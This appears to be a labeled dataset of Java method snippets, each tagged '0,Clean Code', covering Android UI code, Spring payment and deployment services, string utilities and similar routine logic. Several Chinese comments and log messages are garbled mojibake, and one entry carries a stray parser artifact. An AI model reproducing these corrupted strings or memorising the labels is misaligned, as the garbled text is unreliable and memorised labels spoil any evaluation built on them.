        try (FileSystem jarfs=FileSystems.newFileSystem(file,(ClassLoader)null)){
          for (          Path rootPath : jarfs.getRootDirectories()) {
            Files.walkFileTree(rootPath,simpleFileVisitor);
          }
        }
       }
      return super.visitFile(file,attrs);
    }
  }
;
  for (  String s : paths) {
    try {
      Files.walkFileTree(Paths.get(s).toAbsolutePath(),visitor);
    }
 catch (    Exception e) {
      throw new RuntimeException(e);
    }
  }
  return new ArrayList<>(locales);
}",0,Clean Code
"/** 
 * 鑾峰彇鏂囦欢
 * @param entity 鍙傛暟瀵硅薄
 * @return 鏂囦欢娴侊紝鍙兘涓虹┖
 */
@Override public InputStream downFile(UploadEntity entity){
  InputStream inputStream=null;
  OkHttpClient client=new OkHttpClient();
  okhttp3.Response resp=null;
  try {
    String encodedFileName=URLEncoder.encode(entity.getPath(),""utf-8"").replace(""+"",""%20"");
    String finalUrl=String.format(""%s%s"",""1"".equals(entity.getIsPublic()) ? config.getPublicUrl() : config.getPrivateUrl(),encodedFileName);
    if (!""1"".equals(entity.getIsPublic())) {
      finalUrl=clint.privateDownloadUrl(finalUrl);
    }
    Request request=new Request.Builder().url(finalUrl).build();
    resp=client.newCall(request).execute();
    if (resp.isSuccessful()) {
      ResponseBody body=resp.body();
      if (body != null) {
        inputStream=body.byteStream();
      }
    }
    return inputStream;
  }
 catch (  UnsupportedEncodingException e) {
    log.error(""鏂囦欢銆恵}銆戣繘琛孶RLEncoder缂栫爜澶辫触锛�"",entity.getPath());
  }
catch (  IOException e) {
    log.error(""涓冪墰浜戞枃浠躲�恵}銆戜笅杞藉け璐ワ紒"",entity.getPath());
  }
 finally {
    if (resp != null && inputStream == null) {
      resp.close();
    }
  }
  return null;
}",0,Clean Code
"private void setAuditFieldParameters(JoinPoint joinPoint){
  Object[] args=joinPoint.getArgs();
  if (args != null && args.length != 0) {
    MethodSignature signature=(MethodSignature)joinPoint.getSignature();
    Method method=signature.getMethod();
    Annotation[][] parametersAnnotations=method.getParameterAnnotations();
    List<String> parameterNames=Arrays.asList(signature.getParameterNames());
    for (    Annotation[] annotations : parametersAnnotations) {
      for (      Annotation annotation : annotations) {
        if ((annotation instanceof AuditField)) {
          String parameterName=((AuditField)annotation).name();
          int parameterOrder=parameterNames.indexOf(parameterName);
          if (parameterOrder > 0 && parameterOrder < args.length) {
            Object value=args[parameterOrder];
            auditLogService.getCurrentAuditLog().ifPresent(auditLog -> auditLog.addAuditLogField(parameterName,value.toString()));
          }
        }
      }
    }
  }
}",0,Clean Code
"void fillScrapViewsInPostLayout(){
  List<RecyclerView.ViewHolder> scrapList=mRecycler.getScrapList();
  final int scrapSize=scrapList.size();
  if (scrapSize == 0) {
    return;
  }
  if (mDisappearingPositions == null || scrapSize > mDisappearingPositions.length) {
    int length=mDisappearingPositions == null ? 16 : mDisappearingPositions.length;
    while (length < scrapSize) {
      length=length << 1;
    }
    mDisappearingPositions=new int[length];
  }
  int totalItems=0;
  for (int i=0; i < scrapSize; i++) {
    int pos=scrapList.get(i).getAdapterPosition();
    if (pos >= 0) {
      mDisappearingPositions[totalItems++]=pos;
    }
  }
  if (totalItems > 0) {
    Arrays.sort(mDisappearingPositions,0,totalItems);
    mGrid.fillDisappearingItems(mDisappearingPositions,totalItems,mPositionToRowInPostLayout);
  }
  mPositionToRowInPostLayout.clear();
}",0,Clean Code
"/** 
 * 鏍￠獙鏀粯璁㈠崟鏄惁鍙互閫�娆�
 * @param reqDTO 閫�娆剧敵璇蜂俊鎭�
 * @return 鏀粯璁㈠崟
 */
private PayOrderDO validatePayOrderCanRefund(PayRefundCreateReqDTO reqDTO){
  PayOrderDO order=orderService.getOrder(reqDTO.getAppId(),reqDTO.getMerchantOrderId());
  if (order == null) {
    throw exception(PAY_ORDER_NOT_FOUND);
  }
  if (!PayOrderStatusEnum.isSuccessOrRefund(order.getStatus())) {
    throw exception(PAY_ORDER_REFUND_FAIL_STATUS_ERROR);
  }
  if (reqDTO.getPrice() + order.getRefundPrice() > order.getPrice()) {
    throw exception(REFUND_PRICE_EXCEED);
  }
  if (refundMapper.selectCountByAppIdAndOrderId(reqDTO.getAppId(),order.getId(),PayRefundStatusEnum.WAITING.getStatus()) > 0) {
    throw exception(REFUND_HAS_REFUNDING);
  }
  return order;
}",0,Clean Code
"/** 
 * Validates if the provided MasterEntry is valid.
 * @param masterNode The MasterEntry to validate.
 * @param clusterId  The ID of the TubeMQ cluster.
 * @throws IllegalArgumentException If the MasterEntry is invalid.
 */
private void validateMasterEntry(MasterEntry masterNode,Long clusterId){
  if (masterNode == null || StringUtils.isBlank(masterNode.getIp()) || masterNode.getWebPort() <= 0) {
    log.error(""Invalid MasterEntry: ClusterId = {}"",clusterId);
    throw new IllegalArgumentException(""Invalid MasterEntry."");
  }
}",0,Clean Code
"private void refreshShadeColors(){
  if (batteryColors == null)   return;
  mShadeColors=new int[batteryLevels.size() * 2 + 2];
  mShadeLevels=new float[mShadeColors.length];
  float lastPCT=0f;
  for (int i=0; i < batteryLevels.size(); i++) {
    float rangeLength=batteryLevels.get(i) - lastPCT;
    int pointer=2 * i;
    mShadeLevels[pointer]=(lastPCT + rangeLength * 0.3f) / 100;
    mShadeColors[pointer]=batteryColors[i];
    mShadeLevels[pointer + 1]=(batteryLevels.get(i) - rangeLength * 0.3f) / 100;
    mShadeColors[pointer + 1]=batteryColors[i];
    lastPCT=batteryLevels.get(i);
  }
  mShadeLevels[mShadeLevels.length - 2]=(batteryLevels.get(batteryLevels.size() - 1) + (100 - batteryLevels.get(batteryLevels.size() - 1) * 0.3f)) / 100;
  mShadeColors[mShadeColors.length - 2]=Color.GREEN;
  mShadeLevels[mShadeLevels.length - 1]=1f;
  mShadeColors[mShadeColors.length - 1]=Color.GREEN;
}",0,Clean Code
"static Object parseValue(String key,String value,Class<?> valueType) throws IllegalArgumentException {
  return parseValue(key,value,valueType,null,v -> v,Collections.emptyList());
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5ba64729",0,Clean Code
"@Override public void setDataSource(String path,Map<String,String> headers){
  try {
    if (path != null && !TextUtils.isEmpty(path) && path.startsWith(""rtsp"")) {
      mMediaPlayer.setOption(1,""infbuf"",1);
      mMediaPlayer.setOption(1,""rtsp_transport"",""tcp"");
      mMediaPlayer.setOption(1,""rtsp_flags"",""prefer_tcp"");
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  super.setDataSource(path,headers);
}",0,Clean Code
"/** 
 * 瀛楃涓茶浆list
 * @param str         瀛楃涓�
 * @param sep         鍒嗛殧绗�
 * @param filterBlank 杩囨护绾┖鐧�
 * @param trim        鍘绘帀棣栧熬绌虹櫧
 * @return list闆嗗悎
 */
public static final List<String> str2List(String str,String sep,boolean filterBlank,boolean trim){
  List<String> list=new ArrayList<String>();
  if (StringUtils.isEmpty(str)) {
    return list;
  }
  if (filterBlank && StringUtils.isBlank(str)) {
    return list;
  }
  String[] split=str.split(sep);
  for (  String string : split) {
    if (filterBlank && StringUtils.isBlank(string)) {
      continue;
    }
    if (trim) {
      string=string.trim();
    }
    list.add(string);
  }
  return list;
}",0,Clean Code
"private List<String> getMissingTasks(WorkflowDef workflowDef){
  List<String> missing=new ArrayList<>();
  workflowDef.collectTasks().stream().filter(workflowTask -> workflowTask.getType().equals(TaskType.TASK_TYPE_SIMPLE)).map(WorkflowTask::getName).distinct().parallel().forEach(taskName -> {
    try {
      TaskDef taskDef=workflowExecutor.getMetadataClient().getTaskDef(taskName);
    }
 catch (    ConductorClientException cce) {
      if (cce.getStatus() == 404) {
        missing.add(taskName);
      }
 else {
        throw cce;
      }
    }
  }
);
  return missing;
}",0,Clean Code
"@GetMapping(""submitright"") public void submitRight() throws InterruptedException {
  String prefix=""test"";
  ExecutorService threadPool=Executors.newFixedThreadPool(1,new ThreadFactoryBuilder().setNameFormat(prefix + ""%d"").build());
  List<Future> tasks=IntStream.rangeClosed(1,10).mapToObj(i -> threadPool.submit(() -> {
    if (i == 5)     throw new RuntimeException(""error"");
    log.info(""I'm done : {}"",i);
  }
)).collect(Collectors.toList());
  tasks.forEach(task -> {
    try {
      task.get();
    }
 catch (    Exception e) {
      log.error(""Got exception"",e);
    }
  }
);
  threadPool.shutdown();
  threadPool.awaitTermination(1,TimeUnit.HOURS);
}",0,Clean Code
"@Override public void run(ApplicationArguments args) throws Exception {
  publisher.publishEvent(new DeployAppStateActionLoadedEvent(this,STATE.toString(),this.getClass().getSimpleName()));
}
/** 
 * 鑷韩閫昏緫澶勭悊
 * @param order   閮ㄧ讲宸ュ崟
 * @param attrMap 鎵╁睍灞炴у瓧鍏
 */
@Override public void run(DeployAppDO order,Map<String,String> attrMap){
  Long appPackageId=order.getAppPackageId();
  if (appPackageId == null || appPackageId == 0) {
    publisher.publishEvent(new DeployAppEvent(this,DeployAppEventEnum.COMPONENTS_NOT_FOUND,order.getId()));
    return;
  }
  List<AppPackageComponentRelDO> rels=appPackageComponentRelRepository.selectByCondition(AppPackageComponentRelQueryCondition.builder().appPackageId(appPackageId).build());
  Map<String,String> componentVersionMap=new HashMap<>();
  for (  AppPackageComponentRelDO rel : rels) {
    Long componentPackageId=rel.getComponentPackageId();
    assert componentPackageId != null;
    ComponentPackageDO componentPackageDO=componentPackageRepository.getByCondition(ComponentPackageQueryCondition.builder().id(componentPackageId).build());
    assert componentPackageDO != null;
    String key=componentKey(componentPackageDO.getComponentType(),componentPackageDO.getComponentName());
    componentVersionMap.put(key,componentPackageDO.getPackageVersion());
  }
  DeployAppSchema configuration=SchemaUtil.toSchema(DeployAppSchema.class,attrMap.get(DeployAppAttrTypeEnum.APP_CONFIGURATION.toString()));
  for (  DeployAppSchema.SpecComponent specComponent : configuration.getSpec().getComponents()) {
    DeployAppRevisionName revision=DeployAppRevisionName.valueOf(specComponent.getRevisionName());
    if (ComponentTypeEnum.isAddon(revision.getComponentType()) || !revision.isEmptyVersion()) {
      continue;
    }
    String key=componentKey(revision.getComponentType(),revision.getComponentName());
    String actualVersion=componentVersionMap.get(key);
    if (StringUtils.isEmpty(actualVersion)) {
      throw new AppException(AppErrorCode.INVALID_USER_ARGS,String.format(""invalid deploy configuration, cannot find mapping component by componentType %s "" + ""and componentName %s"",revision.getComponentType(),revision.getComponentName()));
    }
    String newRevisionName=DeployAppRevisionName.builder().componentType(revision.getComponentType()).componentName(revision.getComponentName()).version(actualVersion).build().revisionName();
    specComponent.setRevisionName(newRevisionName);
    log.info(""replace revision name success|deployAppId={}|appPackageId={}|revision={}"",order.getId(),appPackageId,newRevisionName);
  }
  deployAppService.updateAttr(order.getId(),DeployAppAttrTypeEnum.APP_CONFIGURATION.toString(),SchemaUtil.toYamlMapStr(configuration));
  publisher.publishEvent(new DeployAppEvent(this,DeployAppEventEnum.COMPONENTS_EXISTS,order.getId()));
}",0,Clean Code
"/** 
 * 计算佣金
 * @param basePrice  佣金基数
 * @param percent    佣金比例
 * @param fixedPrice 固定佣金
 * @return 佣金
 */
int calculatePrice(Integer basePrice,Integer percent,Integer fixedPrice){
  if (fixedPrice != null && fixedPrice > 0) {
    return ObjectUtil.defaultIfNull(fixedPrice,0);
  }
  if (basePrice != null && basePrice > 0 && percent != null && percent > 0) {
    return MoneyUtils.calculateRatePriceFloor(basePrice,Double.valueOf(percent));
  }
  return 0;
}",0,Clean Code
"private PostgresDataType getMeaningfulType(){
  if (Randomly.getBooleanWithSmallProbability() || columns == null || columns.isEmpty()) {
    return PostgresDataType.getRandomType();
  }
 else {
    return Randomly.fromList(columns).getType();
  }
}
",0,Clean Code
"public static String getMacAddress(){
  try {
    InetAddress localHost=InetAddress.getLocalHost();
    NetworkInterface ni=NetworkInterface.getByInetAddress(localHost);
    byte[] hardwareAddress=ni.getHardwareAddress();
    String[] hexadecimal=new String[hardwareAddress.length];
    for (int i=0; i < hardwareAddress.length; i++) {
      hexadecimal[i]=String.format(""%02X"",hardwareAddress[i]);
    }
    String macAddress=String.join(""-"",hexadecimal);
    return generateUUIDFromString(macAddress);
  }
 catch (  Exception e) {
  }
  return NOT_AVAILABLE;
}",0,Clean Code
"@Override protected void onQuoteSelectedPart(){
  if (replyingQuote == null || replyingQuote.message == null || messagePreviewParams.quote != null && messagePreviewParams.quote.message != null && replyingQuote.message.getId() != messagePreviewParams.quote.message.getId()) {
    replyingQuote=messagePreviewParams.quote;
  }
}
",0,Clean Code
"private String unquote(String stringLiteral){
  if (stringLiteral != null && stringLiteral.startsWith(""'"") && stringLiteral.endsWith(""'"")) {
    return stringLiteral.substring(1,stringLiteral.length() - 1);
  }
  return stringLiteral;
}",0,Clean Code
"private void showInfoHint(MessageObject messageObject,CharSequence text,int type){
  checkTopUndoView();
  if (topUndoView == null) {
    return;
  }
  Runnable runnable=() -> {
    if (chatListView != null) {
      int count=chatListView.getChildCount();
      for (int a=0; a < count; a++) {
        View view=chatListView.getChildAt(a);
        if (!(view instanceof ChatMessageCell)) {
          continue;
        }
        ChatMessageCell cell=(ChatMessageCell)view;
        MessageObject message=cell.getMessageObject();
        if (message != null && hintMessageObject != null && message.equals(hintMessageObject)) {
          cell.showHintButton(true,true,type);
        }
      }
    }
    hintMessageObject=null;
  }
;
  topUndoView.showWithAction(0,UndoView.ACTION_TEXT_INFO,text,runnable,runnable);
  hintMessageObject=messageObject;
  hintMessageType=type;
}",0,Clean Code
"public boolean hasModifierKeyOlderThan(final Element pointer){
synchronized (mExpandableArrayOfActivePointers) {
    final int arraySize=mArraySize;
    for (int index=0; index < arraySize; index++) {
      final Element element=mExpandableArrayOfActivePointers.get(index);
      if (element == pointer) {
        return false;
      }
      if (element.isModifier()) {
        return true;
      }
    }
    return false;
  }
}",0,Clean Code
"static Float convertToFloat(Object o){
  if (o.getClass() == Float.class) {
    return (Float)o;
  }
 else   if (o.getClass() == Double.class) {
    double value=((Double)o);
    if (value == 0.0 || (value >= Float.MIN_VALUE && value <= Float.MAX_VALUE) || (value >= -Float.MAX_VALUE && value <= -Float.MIN_VALUE)) {
      return (float)value;
    }
 else {
      throw new IllegalArgumentException(String.format(""Configuration value %s overflows/underflows the float type."",value));
    }
  }
  return Float.parseFloat(o.toString());
}",0,Clean Code
"/** 
 * Retrieves a list of fuzzing strategies based on the characteristics of the provided field schema.
 * @param fuzzedFieldSchema The schema representing the characteristics of the field to be fuzzed.
 * @param invisibleChars    A list of invisible characters to be used in fuzzing strategies.
 * @param maintainSize      If true, maintains the size of the field during fuzzing; if false, allows size modification.
 * @return A list of {@link FuzzingStrategy} objects representing different fuzzing strategies for the field.It returns  {@code FuzzingStrategy.skip()} If the field schema type is not ""string"" or has a binary/byte format.
 * @throws NullPointerException If 'fuzzedFieldSchema' or 'invisibleChars' is null.
 */
public static List<FuzzingStrategy> getFuzzingStrategies(Schema<?> fuzzedFieldSchema,List<String> invisibleChars,boolean maintainSize){
  boolean isNotString=!""string"".equalsIgnoreCase(fuzzedFieldSchema.getType());
  boolean isBinaryFormat=""binary"".equalsIgnoreCase(fuzzedFieldSchema.getFormat());
  boolean isByteFormat=""byte"".equalsIgnoreCase(fuzzedFieldSchema.getFormat());
  if (isNotString || isBinaryFormat || isByteFormat) {
    return Collections.singletonList(FuzzingStrategy.skip().withData(""Field does not match String schema or has binary/byte format""));
  }
  String initialValue=StringGenerator.generateValueBasedOnMinMax(fuzzedFieldSchema);
  final boolean insertWithoutReplace=!maintainSize || !CollectionUtils.isEmpty(fuzzedFieldSchema.getEnum());
  return invisibleChars.stream().map(value -> FuzzingStrategy.replace().withData(CatsUtil.insertInTheMiddle(initialValue,value,insertWithoutReplace))).toList();
}
",0,Clean Code
"/** 
 * equals
 * @param o
 * @return
 */
@Override public boolean equals(Object o){
  if (this == o) {
    return true;
  }
  if (o == null || getClass() != o.getClass()) {
    return false;
  }
  if (!(o instanceof IpPort)) {
    return false;
  }
  try {
    IpPort ctp=(IpPort)o;
    if (ip != null && ip.equals(ctp.ip) && port == ctp.port) {
      return true;
    }
  }
 catch (  Exception e) {
    return false;
  }
  return false;
}
",0,Clean Code
"public boolean isPartSubscribable(String partitionKey){
  Tuple2<Partition,Integer> partConfig=configuredPartInfoMap.get(partitionKey);
  if (partConfig == null || partConfig.getF0() == null || partConfig.getF1() == null) {
    return false;
  }
  return (partConfig.getF1() == 1);
}",0,Clean Code
"@Override public boolean initOnce(){
  for (  Method m : Initiator._GivingHeartItemBuilder().getDeclaredMethods()) {
    Class<?>[] argt=m.getParameterTypes();
    if (m.getName().equals(""a"") && argt.length == 3 && !Modifier.isStatic(m.getModifiers())) {
      HookUtils.hookBeforeIfEnabled(this,m,param -> {
        if (((Method)param.method).getReturnType() == boolean.class) {
          param.setResult(false);
        }
      }
);
    }
  }
  return true;
}",0,Clean Code
"protected UserBinaryDictionary(final Context context,final Locale locale,final boolean alsoUseMoreRestrictiveLocales,final File dictFile,final String name){
  super(context,getDictName(name,locale,dictFile),locale,Dictionary.TYPE_USER,dictFile);
  if (null == locale)   throw new NullPointerException();
  final String localeStr=locale.toString();
  if (SubtypeLocaleUtils.NO_LANGUAGE.equals(localeStr)) {
    mLocaleString=USER_DICTIONARY_ALL_LANGUAGES;
  }
 else {
    mLocaleString=localeStr;
  }
  mAlsoUseMoreRestrictiveLocales=alsoUseMoreRestrictiveLocales;
  mObserver=new ContentObserver(null){
    @Override public void onChange(    final boolean self,    final Uri uri){
      setNeedsToRecreate();
    }
  }
;
  context.getContentResolver().registerContentObserver(Words.CONTENT_URI,true,mObserver);
  reloadDictionaryIfRequired();
}
",0,Clean Code
"private DeployComponentDOExample buildExample(DeployComponentQueryCondition condition){
  DeployComponentDOExample example=new DeployComponentDOExample();
  DeployComponentDOExample.Criteria criteria=example.createCriteria();
  if (StringUtils.isNotBlank(condition.getClusterId())) {
    criteria.andClusterIdEqualTo(condition.getClusterId());
  }
  if (StringUtils.isNotBlank(condition.getNamespaceId())) {
    criteria.andNamespaceIdEqualTo(condition.getNamespaceId());
  }
  if (StringUtils.isNotBlank(condition.getStageId())) {
    criteria.andStageIdEqualTo(condition.getStageId());
  }
  if (StringUtils.isNotBlank(condition.getAppId())) {
    criteria.andAppIdEqualTo(condition.getAppId());
  }
  if (condition.getDeployAppId() != null && condition.getDeployAppId() > 0) {
    criteria.andDeployIdEqualTo(condition.getDeployAppId());
  }
  if (StringUtils.isNotBlank(condition.getIdentifier())) {
    criteria.andIdentifierEqualTo(condition.getIdentifier());
  }
 else   if (StringUtils.isNotBlank(condition.getIdentifierStartsWith())) {
    criteria.andIdentifierLike(String.format(""%s%%"",condition.getIdentifierStartsWith().trim()));
  }
  if (condition.getDeployStatus() != null) {
    criteria.andDeployStatusEqualTo(condition.getDeployStatus().name());
  }
  if (condition.getDeployStatusList() != null && condition.getDeployStatusList().size() > 0) {
    criteria.andDeployStatusIn(condition.getDeployStatusList().stream().map(Enum::name).collect(Collectors.toList()));
  }
  if (condition.getDeployProcessId() != null && condition.getDeployProcessId() > 0) {
    criteria.andDeployProcessIdEqualTo(String.valueOf(condition.getDeployProcessId()));
  }
  return example;
}",0,Clean Code
"@Override public void onPageScrolled(float progress){
  if (progress == 1 && viewPages[1].getVisibility() != View.VISIBLE && !searching) {
    return;
  }
  if (animatingForward) {
    viewPages[0].setTranslationX(-progress * viewPages[0].getMeasuredWidth());
    viewPages[1].setTranslationX(viewPages[0].getMeasuredWidth() - progress * viewPages[0].getMeasuredWidth());
  }
 else {
    viewPages[0].setTranslationX(progress * viewPages[0].getMeasuredWidth());
    viewPages[1].setTranslationX(progress * viewPages[0].getMeasuredWidth() - viewPages[0].getMeasuredWidth());
  }
  if (progress == 1) {
    ViewPage tempPage=viewPages[0];
    viewPages[0]=viewPages[1];
    viewPages[1]=tempPage;
    viewPages[1].setVisibility(View.GONE);
    showScrollbars(true);
    updateCounters(false);
    filterTabsView.stopAnimatingIndicator();
    checkListLoad(viewPages[0]);
    viewPages[0].dialogsAdapter.resume();
    viewPages[1].dialogsAdapter.pause();
  }
}",0,Clean Code
"/** 
 * Does a byte by byte search to try and find the next level 1 element. This method is called if some invalid data is encountered in the parser.
 * @param input The {@link ExtractorInput} from which data has to be read.
 * @return id of the next level 1 element that has been found.
 * @throws EOFException If the end of input was encountered when searching for the next level 1element.
 * @throws IOException If an error occurs reading from the input.
 * @throws InterruptedException If the thread is interrupted.
 */
private long maybeResyncToNextLevel1Element(ExtractorInput input) throws IOException, InterruptedException {
  input.resetPeekPosition();
  while (true) {
    input.peekFully(scratch,0,MAX_ID_BYTES);
    int varintLength=VarintReader.parseUnsignedVarintLength(scratch[0]);
    if (varintLength != C.LENGTH_UNSET && varintLength <= MAX_ID_BYTES) {
      int potentialId=(int)VarintReader.assembleVarint(scratch,varintLength,false);
      if (processor.isLevel1Element(potentialId)) {
        input.skipFully(varintLength);
        return potentialId;
      }
    }
    input.skipFully(1);
  }
}",0,Clean Code
"/** 
 * 鎴彇瀛楃涓�
 * @param str   瀛楃涓�
 * @param start 寮�濮�
 * @return 缁撴灉
 */
public static String substring(final String str,int start){
  if (str == null) {
    return NULLSTR;
  }
  if (start < 0) {
    start=str.length() + start;
  }
  if (start < 0) {
    start=0;
  }
  if (start > str.length()) {
    return NULLSTR;
  }
  return str.substring(start);
}
/** 
 * 鎴彇瀛楃涓�
 * @param str   瀛楃涓�
 * @param start 寮�濮�
 * @param end   缁撴潫
 * @return 缁撴灉
 */
public static String substring(final String str,int start,int end){
  if (str == null) {
    return NULLSTR;
  }
  if (end < 0) {
    end=str.length() + end;
  }
  if (start < 0) {
    start=str.length() + start;
  }
  if (end > str.length()) {
    end=str.length();
  }
  if (start > end) {
    return NULLSTR;
  }
  if (start < 0) {
    start=0;
  }
  if (end < 0) {
    end=0;
  }
  return str.substring(start,end);
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)24);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)56);
    output.writeUInt32NoTag(playingId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    for (int i=0; i < musicList.length(); i++) {
      output.writeRawByte((byte)90);
      output.writeMessageNoTag(musicList.get(i));
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.playingId,playingId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRepeatedMessage(FieldNames.musicList,musicList);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * 娴佸埌鏉ョ殑澶勭悊
 */
@Async(""taskExecutor"") @org.springframework.context.event.EventListener public void onApplicationEvent(MediaArrivalEvent event){
}
/** 
 * 娴佺寮�鐨勫鐞�
 */
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(MediaDepartureEvent event){
  if (""rtsp"".equals(event.getSchema()) && ""rtp"".equals(event.getApp())) {
    InviteInfo inviteInfo=getInviteInfoByStream(null,event.getStream());
    if (inviteInfo != null && (inviteInfo.getType() == InviteSessionType.PLAY || inviteInfo.getType() == InviteSessionType.PLAYBACK)) {
      removeInviteInfo(inviteInfo);
      storage.stopPlay(inviteInfo.getDeviceId(),inviteInfo.getChannelId());
    }
  }
}
",0,Clean Code
"private void initView(){
  ivQRCode=findViewById(R.id.ivQRCode);
  tvAddress=findViewById(R.id.tvAddress);
  refreshQRCode();
  findViewById(R.id.pushLocal).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      try {
        ClipboardManager manager=(ClipboardManager)PushActivity.this.getSystemService(Context.CLIPBOARD_SERVICE);
        if (manager != null) {
          if (manager.hasPrimaryClip() && manager.getPrimaryClip() != null && manager.getPrimaryClip().getItemCount() > 0) {
            ClipData.Item addedText=manager.getPrimaryClip().getItemAt(0);
            Intent newIntent=new Intent(mContext,DetailActivity.class);
            newIntent.putExtra(""id"",addedText.getText().toString().trim());
            newIntent.putExtra(""sourceKey"",""push_agent"");
            newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PushActivity.this.startActivity(newIntent);
          }
        }
      }
 catch (      Throwable th) {
      }
    }
  }
);
}",0,Clean Code
"@Override public int getCurrentItemTop(){
  if (gridView.getChildCount() <= 0) {
    gridView.setTopGlowOffset(currentItemTop=gridView.getPaddingTop());
    progressView.setTranslationY(0);
    return Integer.MAX_VALUE;
  }
  View child=gridView.getChildAt(0);
  RecyclerListView.Holder holder=(RecyclerListView.Holder)gridView.findContainingViewHolder(child);
  int top=child.getTop();
  int newOffset=AndroidUtilities.dp(7);
  if (top >= AndroidUtilities.dp(7) && holder != null && holder.getAdapterPosition() == 0) {
    newOffset=top;
  }
  progressView.setTranslationY(newOffset + (getMeasuredHeight() - newOffset - AndroidUtilities.dp(50)- progressView.getMeasuredHeight()) / 2);
  gridView.setTopGlowOffset(newOffset);
  return currentItemTop=newOffset;
}",0,Clean Code
"/** 
 * Calls the start transition listener. This must be called on the UI thread.
 */
@SuppressWarnings(""WeakerAccess"") void callStartTransitionListener(){
  final OnStartEnterTransitionListener listener;
  if (mAnimationInfo == null) {
    listener=null;
  }
 else {
    mAnimationInfo.mEnterTransitionPostponed=false;
    listener=mAnimationInfo.mStartEnterTransitionListener;
    mAnimationInfo.mStartEnterTransitionListener=null;
  }
  if (listener != null) {
    listener.onStartEnterTransition();
  }
}
",0,Clean Code
"@Override protected void before(MethodHookParam param){
  Context context=(Context)XposedHelpers.callMethod(param.thisObject,""getActivity"");
  boolean isBluetoothA2dpOn=((AudioManager)context.getSystemService(Context.AUDIO_SERVICE)).isBluetoothA2dpOn();
  boolean isWiredHeadsetOn=((AudioManager)context.getSystemService(Context.AUDIO_SERVICE)).isWiredHeadsetOn();
  if (isBluetoothA2dpOn || isWiredHeadsetOn) {
    if (mode == null)     mode=""none"";
  }
  if (mode != null) {
    param.setResult(mode);
  }
}
@Override protected void before(MethodHookParam param){
  Object o=param.args[1];
  if (o instanceof String) {
    if (""none"".equals(o) || ""dolby"".equals(o) || ""misound"".equals(o))     mode=(String)o;
  }
}",0,Clean Code
"@Override public void tempSaveAnswer(AnswerRequest request){
  String projectId=request.getProjectId();
  if (!Integer.valueOf(0).equals(request.getTempSave()) || request.getTempAnswer() == null || projectId == null) {
    return;
  }
  String answerId=ContextHelper.getCookie(AppConsts.COOKIE_RANDOM_PROJECT_PREFIX + projectId);
  if (answerId == null) {
    return;
  }
  if (!SecurityContextUtils.isAuthenticated()) {
    return;
  }
  AnswerRequest answerRequest=new AnswerRequest();
  answerRequest.setId(answerId);
  answerRequest.setTempSave(0);
  answerRequest.setTempAnswer(request.getTempAnswer());
  answerService.updateAnswer(answerRequest);
}",0,Clean Code
"/** 
 * find the mock method fit for specified method node
 * @param memberInjectMethods mock methods available
 * @param node                method node to match for
 * @return mock method info
 */
private MethodInfo getMemberInjectMethodName(Set<MethodInfo> memberInjectMethods,MethodInsnNode node){
  for (  MethodInfo m : memberInjectMethods) {
    String nodeOwner=ClassUtil.fitCompanionClassName(node.owner);
    String nodeName=ClassUtil.fitKotlinAccessorName(node.name);
    String nodeDesc=nodeName.equals(node.name) ? node.desc : MethodUtil.removeFirstParameter(node.desc);
    if (m.getClazz().equals(nodeOwner) && m.getName().equals(nodeName) && m.getDesc().equals(nodeDesc)) {
      return m;
    }
  }
  return null;
}
",0,Clean Code
"public static void moveToWindowScreen(Window currentWindow,Dialog<?> dialog){
  Window newWindow=dialog.getDialogPane().getScene().getWindow();
  DialogPane dialogPane=dialog.getDialogPane();
  double dialogWidth=dialogPane.getPrefWidth() > 0.0 ? dialogPane.getPrefWidth() : (dialogPane.getWidth() > 0.0 ? dialogPane.getWidth() : 360);
  double dialogHeight=dialogPane.getPrefHeight() > 0.0 ? dialogPane.getPrefHeight() : (dialogPane.getHeight() > 0.0 ? dialogPane.getHeight() : 200);
  moveToWindowScreen(currentWindow,newWindow,dialogWidth,dialogHeight);
}
public static void moveToWindowScreen(Window currentWindow,Window newWindow,double newWindowWidth,double newWindowHeight){
  Screen currentScreen=Screen.getScreens().stream().filter(screen -> screen.getVisualBounds().contains(currentWindow.getX(),currentWindow.getY())).findFirst().orElse(null);
  if (currentScreen != null && ((!Double.isNaN(newWindow.getX()) && !Double.isNaN(newWindow.getY())) || !Screen.getPrimary().getVisualBounds().contains(currentWindow.getX(),currentWindow.getY())) && !currentScreen.getVisualBounds().contains(newWindow.getX(),newWindow.getY())) {
    double x=currentWindow.getX() + (currentWindow.getWidth() / 2) - (newWindowWidth / 2);
    double y=currentWindow.getY() + (currentWindow.getHeight() / 2.2) - (newWindowHeight / 2);
    newWindow.setX(x);
    newWindow.setY(y);
  }
}",0,Clean Code
"/** 
 * 鎸夊尮閰嶈幏鍙栨垨鏈塊EY
 * @param pattern 瑙勫垯
 * @return Set<String>
 * @author fzr
 */
public static Set<String> matchSet(String pattern){
  Set<String> keys=new LinkedHashSet<>();
  RedisUtil.handler().execute((  RedisConnection connection) -> {
    try (Cursor<byte[]> cursor=connection.scan(ScanOptions.scanOptions().count(Long.MAX_VALUE).match(pattern).build())){
      cursor.forEachRemaining(item -> {
        keys.add(RedisSerializer.string().deserialize(item));
      }
);
      return null;
    }
 catch (    Exception e) {
      throw new RuntimeException(e);
    }
  }
);
  return keys;
}
",0,Clean Code
"@Override protected void onDetachedFromWindow(){
  super.onDetachedFromWindow();
  try {
    if ((!PipVideoOverlay.isVisible() || webView.getVisibility() != VISIBLE) && webView.getParent() != null) {
      removeView(webView);
      webView.stopLoading();
      webView.loadUrl(""about:blank"");
      webView.destroy();
    }
    if (!videoView.isInline() && !PipVideoOverlay.isVisible()) {
